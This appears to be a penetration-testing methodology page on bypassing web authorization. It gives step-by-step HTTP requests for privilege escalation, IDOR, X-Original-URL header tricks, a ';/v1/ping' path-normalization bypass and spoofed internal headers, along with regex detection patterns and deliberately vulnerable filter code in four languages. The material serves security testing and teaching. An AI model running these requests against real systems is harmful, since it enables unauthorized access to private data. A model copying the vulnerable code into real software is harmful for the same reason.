# Bypassing Authorization Schema

## Check List

## Methodology

### Black Box

#### Broken Authorization

{% stepper %}
{% step %}
Authenticate to the application using a standard (non-administrative) user account
{% endstep %}

{% step %}
Identify administrative functions by: Browsing the application as an admin user (if available), or Enumerating common administrative paths such as

```hurl
https://www.example.com/admin/addUser.jsp
```
{% endstep %}

{% step %}
Capture a legitimate administrative request, for example

```http
POST /admin/addUser.jsp HTTP/1.1
Host: www.example.com

userID=fakeuser&role=3&group=grp001
```
{% endstep %}

{% step %}
Log out from the administrator account
{% endstep %}

{% step %}
Log in as a non-administrative (standard privilege) user
{% endstep %}

{% step %}
Replay the captured administrative request using the standard user’s session
{% endstep %}

{% step %}
Observe whether the server processes the request successfully (creates a new user)
{% endstep %}

{% step %}
If the request succeeds, verify whether the newly created user account is active and functional
{% endstep %}
{% endstepper %}

***

#### Horizontal Bypassing Authorization

{% stepper %}
{% step %}
Register two separate user accounts with identical roles and privileges (`userA` and `userB`)
{% endstep %}

{% step %}
Log in as both users in separate browsers or sessions
{% endstep %}

{% step %}
Capture the session identifiers (`SessionID`) for both users
{% endstep %}

{% step %}
Identify a function accessible to both users, such as

```http
POST /account/viewSettings HTTP/1.1
Host: www.example.com
Cookie: SessionID=USERA_SESSION

username=userA
```
{% endstep %}

{% step %}
Confirm that the legitimate response for `userA` returns only `userA`’s personal data
{% endstep %}

{% step %}
While logged in as `userB`, intercept a similar request and modify (The `username` parameter to `userA` and Keep `SessionID=USERB_SESSION`
{% endstep %}

{% step %}
Send the modified request

```http
POST /account/viewSettings HTTP/1.1
Host: www.example.com
Cookie: SessionID=USERB_SESSION

username=userA
```
{% endstep %}

{% step %}
Observe the server response
{% endstep %}

{% step %}
If the response contains `userA`’s private data while authenticated as `userB`, confirm unauthorized horizontal access
{% endstep %}
{% endstepper %}

***

#### Broken Authorization via Header Handling

{% stepper %}
{% step %}
Identify a restricted endpoint that is blocked by frontend access control (`/admin` or `/console`)
{% endstep %}

{% step %}
Attempt to access the restricted endpoint directly

```http
GET /admin HTTP/1.1
Host: www.example.com
```

If the server gives you a 403 or says "Access Unauthorized" in response
{% endstep %}

{% step %}
Send a normal baseline request without special headers

```http
GET / HTTP/1.1
Host: www.example.c
```

Record the response for comparison.
{% endstep %}

{% step %}
Send a request including the `X-Original-URL` header pointing to a non-existent resource

```http
GET / HTTP/1.1
Host: www.example.com
X-Original-URL: /donotexist1
```

Observe the response
{% endstep %}

{% step %}
Check whether the response returns indicators such as HTTP 404 status code or “Resource not found” message

If so, confirm support for the `X-Original-URL` header
{% endstep %}

{% step %}
Send a request including the `X-Rewrite-URL` header pointing to a non-existent resource

```http
GET / HTTP/1.1
Host: www.example.com
X-Rewrite-URL: /donotexist2
```

Observe the response
{% endstep %}

{% step %}
If the response indicates the non-existent resource was processed, confirm support for the `X-Rewrite-URL` header
{% endstep %}

{% step %}
After confirming header support, attempt access control bypass by sending a request to an allowed endpoint ( `/`) while specifying the restricted endpoint in the supported header

```http
GET / HTTP/1.1
Host: www.example.com
X-Original-URL: /admin
```

or

```http
GET / HTTP/1.1
Host: www.example.com
X-Rewrite-URL: /admin
```
{% endstep %}

{% step %}
Observe whether the application processes the restricted resource and returns its content
{% endstep %}

{% step %}
Confirm the vulnerability if the restricted endpoint becomes accessible through header manipulation despite direct access being blocked
{% endstep %}
{% endstepper %}

***

### White Box

#### Authorization Decision via Client-Controlled Role Claim (Unverified Role Header / Cookie / Field)

{% stepper %}
{% step %}
Map the entire target system using Burp Suite
{% endstep %}

{% step %}
Draw the entry points and endpoints in XMind
{% endstep %}

{% step %}
Decompile the application based on the programming language used
{% endstep %}

{% step %}
Log in with a low-privilege account and a high-privilege account in two separate sessions, and diff every header, cookie, and body field present in both authenticated requests — look for anything resembling a role or permission descriptor (`role=user` vs `role=admin`, `X-User-Role`, a `perm` cookie, a hidden form field, a custom JWT claim)
{% endstep %}

{% step %}
In the decompiled code, locate the authorization middleware/filter/interceptor that runs in front of privileged endpoints and identify exactly where it reads the role/permission value from: a server-side lookup keyed by the session/user ID, or directly from data supplied by the client on the current request
{% endstep %}

{% step %}
If the value comes directly from client-supplied request data, check whether it is bound to anything tamper-evident (HMAC, server-side signature, encrypted cookie) or whether it can simply be edited and replayed as-is
{% endstep %}

{% step %}
If a JWT is involved, check whether the role/permission claim is read independently of the signature verification step, and whether verification actually fails closed when the signature doesn't match a recomputed value, rather than only checking expiry

**VSCode (Regex Detection)**

{% tabs %}
{% tab title="C#" %}
```regexp
(Request\.Cookies\[\s*"role")|(Request\.Headers\[\s*"X-Role")|(Request\.Headers\[\s*"X-User-Role")
```
{% endtab %}

{% tab title="Java" %}
```regexp
(getHeader\(\s*"X-Role")|(getHeader\(\s*"X-User-Role")|(getCookies\(\).*"role")
```
{% endtab %}

{% tab title="PHP" %}
```regexp
(\$_COOKIE\[\s*['"]role['"]\])|(\$_SERVER\[\s*['"]HTTP_X_ROLE['"]\])|(\$_REQUEST\[\s*['"]role['"]\])
```
{% endtab %}

{% tab title="Node.js" %}
```regex
(req\.cookies\.role)|(req\.headers\[['"]x-role['"]\])|(req\.headers\[['"]x-user-role['"]\])
```
{% endtab %}
{% endtabs %}

**RipGrep (Regex Detection(Linux))**

{% tabs %}
{% tab title="C#" %}
```regexp
Request\.Cookies\[\s*"role"|Request\.Headers\[\s*"X-Role"|Request\.Headers\[\s*"X-User-Role"
```
{% endtab %}

{% tab title="Java" %}
```regexp
getHeader\(\s*"X-Role"|getHeader\(\s*"X-User-Role"|getCookies\(\).*"role"
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\$_COOKIE\[\s*['"]role['"]\]|\$_SERVER\[\s*['"]HTTP_X_ROLE['"]\]|\$_REQUEST\[\s*['"]role['"]\]
```
{% endtab %}

{% tab title="Node.js" %}
```regex
req\.cookies\.role|req\.headers\[['"]x-role['"]\]|req\.headers\[['"]x-user-role['"]\]
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```c#
public class RoleAuthorizationFilter : IAuthorizationFilter
{
    public void OnAuthorization(AuthorizationFilterContext context)
    {
        var role = context.HttpContext.Request.Cookies["role"]; // [1]

        if (role != "admin") // [2]
        {
            context.Result = new ForbiddenResult();
        }
    }
}

[HttpGet("admin/users")]
[TypeFilter(typeof(RoleAuthorizationFilter))]
public IActionResult ListUsers()
{
    return Ok(_userService.GetAll()); // [3]
}
```
{% endtab %}

{% tab title="Java" %}
```java
public class RoleAuthorizationFilter implements Filter {
    public void doFilter(ServletRequest req, ServletResponse res, FilterChain chain)
            throws IOException, ServletException {
        HttpServletRequest httpReq = (HttpServletRequest) req;
        String role = getCookieValue(httpReq, "role"); // [1]

        if (!"admin".equals(role)) { // [2]
            ((HttpServletResponse) res).sendError(403);
            return;
        }
        chain.doFilter(req, res);
    }
}

@GetMapping("/admin/users")
public ResponseEntity<?> listUsers() {
    return ResponseEntity.ok(userService.getAll()); // [3]
}
```
{% endtab %}

{% tab title="PHP" %}
```php
function requireAdmin() {
    $role = $_COOKIE['role'] ?? null; // [1]

    if ($role !== 'admin') { // [2]
        http_response_code(403);
        exit;
    }
}

function listUsers() {
    requireAdmin();
    echo json_encode(UserService::getAll()); // [3]
}
```
{% endtab %}

{% tab title="Node.js" %}
```js
function requireAdmin(req, res, next) {
  const role = req.cookies.role; // [1]

  if (role !== 'admin') { // [2]
    return res.status(403).end();
  }
  next();
}

app.get('/admin/users', requireAdmin, (req, res) => {
  res.json(userService.getAll()); // [3]
});
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Note the markers: `[1]` the role used for the authorization decision is read straight from a client-suppliable cookie, `[2]` the comparison trusts that value with no server-side lookup against the actual user record, `[3]` a successful match returns the full privileged dataset
{% endstep %}

{% step %}
Replay the request with the role value edited to a higher-privileged role and confirm the response

```http
GET /admin/users HTTP/1.1
Host: target.tld
Cookie: session=a1b2c3; role=user
```

```
HTTP/1.1 403 Forbidden
```

```http
GET /admin/users HTTP/1.1
Host: target.tld
Cookie: session=a1b2c3; role=admin
```

```http
HTTP/1.1 200 OK
Content-Type: application/json

[{"id":1,"username":"alice","email":"alice@target.tld"},{"id":2,"username":"bob","email":"bob@target.tld"}]
```
{% endstep %}

{% step %}
If the full user list is returned after only changing the client-controlled value, the authorization schema is confirmed to rely on a tamperable client claim instead of a server-side identity check
{% endstep %}
{% endstepper %}

***

#### Authorization Bypass via Path Normalization Mismatch Between the Authorization Filter and the Request Router

{% stepper %}
{% step %}
Map the entire target system using Burp Suite
{% endstep %}

{% step %}
Draw the entry points and endpoints in XMind
{% endstep %}

{% step %}
Decompile the application based on the programming language used
{% endstep %}

{% step %}
In the decompiled code, find the global authorization filter/interceptor that runs before routing, and identify how it decides which paths are allowed without authentication — look specifically for an allow-list/skip-list built by matching substrings or suffixes against a "normalized" URI string (e.g. `uri.contains("/actuator")`, `uri.endsWith("/ping")`)
{% endstep %}

{% step %}
Find the normalization function the filter calls before that match (e.g. `getNormalizedUri`) and trace exactly what it does and in what order: URL-decoding, collapsing duplicate slashes, resolving `.`/`..` segments
{% endstep %}

{% step %}
Separately, find how the underlying router/dispatcher (framework routing layer, servlet mapping, or reverse-proxy rule) parses the same raw request path to select a controller — and check whether it normalizes the path the same way, in the same order, or whether it strips additional elements the filter's normalization is unaware of (such as a `;`-delimited matrix parameter segment)
{% endstep %}

{% step %}
If the filter's allow-list match runs against a differently-normalized string than what the dispatcher ultimately routes to, craft a path where the filter's normalization collapses into an allow-listed suffix (e.g. ending in `/v1/ping`), while the dispatcher — which discards everything after the delimiter the filter does not account for — still resolves the request to the real privileged controller

**VSCode (Regex Detection)**

{% tabs %}
{% tab title="C#" %}
```regexp
(\.Contains\(\s*"\/actuator")|(\.EndsWith\(\s*"\/ping")|(GetNormalizedUri)
```
{% endtab %}

{% tab title="Java" %}
```regexp
(\.contains\(\s*"\/actuator")|(\.endsWith\(\s*"\/ping")|(getNormalizedUri)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
(str_contains\(.*['"]\/actuator)|(str_ends_with\(.*['"]\/ping)|(getNormalizedUri)
```
{% endtab %}

{% tab title="Node.js" %}
```regex
(\.includes\(\s*['"]\/actuator)|(\.endsWith\(\s*['"]\/ping)|(getNormalizedUri)
```
{% endtab %}
{% endtabs %}

**RipGrep (Regex Detection(Linux))**

{% tabs %}
{% tab title="C#" %}
```regexp
\.Contains\(\s*"\/actuator"|\.EndsWith\(\s*"\/ping"|GetNormalizedUri
```
{% endtab %}

{% tab title="Java" %}
```regexp
\.contains\(\s*"\/actuator"|\.endsWith\(\s*"\/ping"|getNormalizedUri
```
{% endtab %}

{% tab title="PHP" %}
```regexp
str_contains\(.*['"]\/actuator|str_ends_with\(.*['"]\/ping|getNormalizedUri
```
{% endtab %}

{% tab title="Node.js" %}
```regex
\.includes\(\s*['"]\/actuator|\.endsWith\(\s*['"]\/ping|getNormalizedUri
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```c#
public bool ShouldSkipAuth(HttpContext context)
{
    var uri = GetNormalizedUri(context.Request); // [1]

    if (uri.Contains("/actuator") || uri.EndsWith("/v1/ping")) // [2]
    {
        return true;
    }
    return false;
}

private string GetNormalizedUri(HttpRequest request)
{
    var path = Uri.UnescapeDataString(request.Path.Value); // [3]
    return path.Replace("//", "/");
}
```
{% endtab %}

{% tab title="Java" %}
```java
public boolean shouldSkipAuth(HttpServletRequest request) {
    String uri = getNormalizedUri(request); // [1]

    if (uri.contains("/actuator") || uri.endsWith("/v1/ping")) { // [2]
        return true;
    }
    return false;
}

private String getNormalizedUri(HttpServletRequest request) {
    String uri = request.getRequestURI();
    return removeExtraSlashes(
        URLDecoder.decode(URI.create(uri).normalize().toString(), StandardCharsets.UTF_8)
    ); // [3]
}
```
{% endtab %}

{% tab title="PHP" %}
```php
function shouldSkipAuth($request) {
    $uri = getNormalizedUri($request); // [1]

    if (str_contains($uri, '/actuator') || str_ends_with($uri, '/v1/ping')) { // [2]
        return true;
    }
    return false;
}

function getNormalizedUri($request) {
    $path = urldecode($request->getPathInfo()); // [3]
    return preg_replace('#/+#', '/', $path);
}
```
{% endtab %}

{% tab title="Node.js" %}
```js
function shouldSkipAuth(req) {
  const uri = getNormalizedUri(req); // [1]

  if (uri.includes('/actuator') || uri.endsWith('/v1/ping')) { // [2]
    return true;
  }
  return false;
}

function getNormalizedUri(req) {
  const path = decodeURIComponent(req.path); // [3]
  return path.replace(/\/+/g, '/');
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Note the markers: `[1]` the filter builds its decision on a string it normalizes itself, `[2]` the allow-list match is a plain substring/suffix check against that string, `[3]` the normalization only URL-decodes and collapses slashes — it never strips a `;`-delimited segment, which the underlying router/servlet container does strip before dispatching to a controller
{% endstep %}

{% step %}
Append the real privileged path as a prefix and the allow-listed suffix after a `;` so the filter's normalization still ends in `/v1/ping` (skip auth) while the router strips everything from `;` onward and dispatches straight to the privileged controller

```http
GET /admin/users;/v1/ping HTTP/1.1
Host: target.tld
```

```http
HTTP/1.1 200 OK
Content-Type: application/json

[{"id":1,"username":"alice","email":"alice@target.tld"},{"id":2,"username":"bob","email":"bob@target.tld"}]
```
{% endstep %}

{% step %}
If the privileged resource is returned with no `Authorization` header or session cookie present at all, the bypass is confirmed: the authorization filter's allow-list decision and the router's actual dispatch decision were made against two different interpretations of the same raw path
{% endstep %}
{% endstepper %}

***

#### Authorization Bypass via Trusted Internal/Proxy Header Spoofing

{% stepper %}
{% step %}
Map the entire target system using Burp Suite
{% endstep %}

{% step %}
Draw the entry points and endpoints in XMind
{% endstep %}

{% step %}
Decompile the application based on the programming language used
{% endstep %}

{% step %}
Identify whether the application is meant to sit behind a reverse proxy, load balancer, or API gateway, and check whether any authorization decision in the code depends on a header that should only ever be set by that upstream component (e.g. `X-Internal-Request`, `X-Forwarded-For`, `X-Real-IP`, `X-Forwarded-Host`, `X-Original-URL`, `X-Gateway-Auth`)
{% endstep %}

{% step %}
In the decompiled code, locate the authorization check that reads this header and determine whether it validates that the header could only have come from the trusted upstream (e.g. cross-checking it against a known internal IP range, mutual TLS, or a shared secret) — or whether it simply trusts whatever value is present
{% endstep %}

{% step %}
Check whether the application is reachable directly, bypassing the reverse proxy entirely — on an internal network segment, an alternate port, a different hostname/IP, or because the proxy in front of it does not strip or overwrite the header before forwarding the request
{% endstep %}

{% step %}
If the application is directly reachable and trusts a client-suppliable header for an authorization decision, the entire authorization schema can be bypassed by simply setting that header on the request

**VSCode (Regex Detection)**

{% tabs %}
{% tab title="C#" %}
```regexp
(Headers\[\s*"X-Internal-Request")|(Headers\[\s*"X-Forwarded-For")|(Headers\[\s*"X-Auth-Bypass")
```
{% endtab %}

{% tab title="Java" %}
```regexp
(getHeader\(\s*"X-Internal-Request")|(getHeader\(\s*"X-Forwarded-For")|(getHeader\(\s*"X-Auth-Bypass")
```
{% endtab %}

{% tab title="PHP" %}
```regexp
(headers\[\s*['"]X-Internal-Request['"]\])|(\$_SERVER\[\s*['"]HTTP_X_FORWARDED_FOR['"]\])|(\$_SERVER\[\s*['"]HTTP_X_AUTH_BYPASS['"]\])
```
{% endtab %}

{% tab title="Node.js" %}
```regex
(req\.headers\[['"]x-internal-request['"]\])|(req\.headers\[['"]x-forwarded-for['"]\])|(req\.headers\[['"]x-auth-bypass['"]\])
```
{% endtab %}
{% endtabs %}

**RipGrep (Regex Detection(Linux))**

{% tabs %}
{% tab title="C#" %}
```regexp
Headers\[\s*"X-Internal-Request"|Headers\[\s*"X-Forwarded-For"|Headers\[\s*"X-Auth-Bypass"
```
{% endtab %}

{% tab title="Java" %}
```regexp
getHeader\(\s*"X-Internal-Request"|getHeader\(\s*"X-Forwarded-For"|getHeader\(\s*"X-Auth-Bypass"
```
{% endtab %}

{% tab title="PHP" %}
```regexp
headers\[\s*['"]X-Internal-Request['"]\]|\$_SERVER\[\s*['"]HTTP_X_FORWARDED_FOR['"]\]|\$_SERVER\[\s*['"]HTTP_X_AUTH_BYPASS['"]\]
```
{% endtab %}

{% tab title="Node.js" %}
```regex
req\.headers\[['"]x-internal-request['"]\]|req\.headers\[['"]x-forwarded-for['"]\]|req\.headers\[['"]x-auth-bypass['"]\]
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```c#
public class InternalAuthFilter : IAuthorizationFilter
{
    public void OnAuthorization(AuthorizationFilterContext context)
    {
        var isInternal = context.HttpContext.Request.Headers["X-Internal-Request"]; // [1]

        if (isInternal == "true") // [2]
        {
            return; // skips every further authorization check
        }

        if (!context.HttpContext.User.IsInRole("Admin"))
        {
            context.Result = new ForbiddenResult();
        }
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
public class InternalAuthFilter implements Filter {
    public void doFilter(ServletRequest req, ServletResponse res, FilterChain chain)
            throws IOException, ServletException {
        HttpServletRequest httpReq = (HttpServletRequest) req;
        String isInternal = httpReq.getHeader("X-Internal-Request"); // [1]

        if ("true".equals(isInternal)) { // [2]
            chain.doFilter(req, res); // skips the role check entirely
            return;
        }

        if (!httpReq.isUserInRole("Admin")) {
            ((HttpServletResponse) res).sendError(403);
            return;
        }
        chain.doFilter(req, res);
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
function authorize($request) {
    $isInternal = $request->headers['X-Internal-Request'] ?? null; // [1]

    if ($isInternal === 'true') { // [2]
        return true; // skips the role check entirely
    }

    return currentUserHasRole('admin');
}
```
{% endtab %}

{% tab title="Node.js" %}
```js
function authorize(req) {
  const isInternal = req.headers['x-internal-request']; // [1]

  if (isInternal === 'true') { // [2]
    return true; // skips the role check entirely
  }

  return currentUserHasRole(req, 'admin');
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Note the markers: `[1]` the header is read straight off the incoming request with no check on where the request actually came from, `[2]` a match short-circuits every remaining authorization check for the rest of the request
{% endstep %}

{% step %}
Send the header directly against the application, bypassing the proxy if a direct route exists, or simply including it on a normal internet-facing request if the proxy does not strip unknown headers

```http
GET /admin/dashboard HTTP/1.1
Host: target.tld
X-Internal-Request: true
```

```http
HTTP/1.1 200 OK
Content-Type: text/html

<html>... full admin dashboard ...</html>
```
{% endstep %}

{% step %}
If the privileged page or API response is returned without any valid session or role, the authorization schema is confirmed to rely on a client-spoofable trust header instead of verifying the actual origin of the request
{% endstep %}
{% endstepper %}

***

## Cheat Sheet
